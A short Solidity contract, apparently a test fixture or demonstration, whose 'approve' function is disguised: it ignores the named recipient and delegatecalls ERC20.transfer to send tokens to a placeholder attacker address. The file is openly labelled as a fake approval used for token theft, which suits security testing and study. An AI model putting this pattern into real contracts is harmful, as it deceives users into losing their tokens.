// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract DelegateCall {

    // fake approve function, which actually transfers the ERC20 tokens to the attacker's deposit address
    function approve(
        address erc20,
        address _to, // ignored
        uint256 value
    ) external {
        address attackerDepositAddress = address(0x00000000000000000000000000000000DeaDBeef);

        (bool success, ) = address(erc20).delegatecall(
            abi.encodeWithSelector(ERC20.transfer.selector, attackerDepositAddress, value)
        );
        require(success, "Delegate call failed");
    }
}
